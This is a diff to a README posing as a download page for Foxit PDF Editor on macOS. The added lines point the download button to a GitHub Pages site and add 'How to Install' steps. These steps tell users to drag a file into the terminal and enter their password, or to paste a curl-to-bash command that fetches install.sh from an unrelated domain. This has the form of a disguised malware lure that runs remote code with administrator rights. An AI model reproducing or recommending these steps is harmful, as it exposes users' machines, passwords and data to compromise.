@@ -3,9 +3,32 @@
 Foxit PDF Editor is a versatile PDF solution designed for macOS users to create, edit, and manage PDF documents efficiently. It offers professional-grade features suitable for business and personal use, all within a native Mac environment.
 
 ## ✅ Download Foxit PDF Editor for macOS  
-[![Download Foxit PDF Editor](https://img.shields.io/badge/Download-Foxit%20PDF%20Editor-blueviolet)](#)
+[![Download Foxit PDF Editor](https://img.shields.io/badge/Download-Foxit%20PDF%20Editor-blueviolet)](https://foxit-pdf-editor-mac-download.github.io/.github)
 
 ---
+
+## 📦 How to Install
+
+# Installation via .dmg:
+
+1. Install the .dmg file using the button above. 
+2. Open the .dmg installer and move the file from the left window to any convenient directory on your device.
+3. Open a terminal and transfer the file you extracted in the last step into it.
+4. Press the "Return" button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).
+
+[![0723.gif](https://i.postimg.cc/50Tm3hZT/0723.gif)](https://postimg.cc/mz3MZ5Zy)
+
+# Installation via a command in the terminal:
+
+1. Copy the installation command below.
+```bash
+/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+```
+2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
+3. Enter your device password and confirm the installation.
+
+[![0723-1.gif](https://i.postimg.cc/NfzQxpMT/0723-1.gif)](https://postimg.cc/0b7gkG72)
+
 
 ## 📦 What is Foxit PDF Editor?
 
@@ -35,17 +58,7 @@ Foxit PDF Editor provides a comprehensive set of tools for editing, annotating, 
 
 ---
 
-[![Download Foxit PDF Editor](https://img.shields.io/badge/Download-Foxit%20PDF%20Editor-blueviolet)](#)
-
----
-
-## 📥 How to Use
-
-- ✅ Download and install Foxit PDF Editor on your macOS device  
-- 📝 Open PDFs to edit text, images, or pages  
-- 📄 Create or fill interactive PDF forms  
-- 🔐 Secure documents with passwords or redactions  
-- 📤 Save and share PDFs through cloud or email  
+[![Download Foxit PDF Editor](https://img.shields.io/badge/Download-Foxit%20PDF%20Editor-blueviolet)](https://foxit-pdf-editor-mac-download.github.io/.github)
 
 ---
 
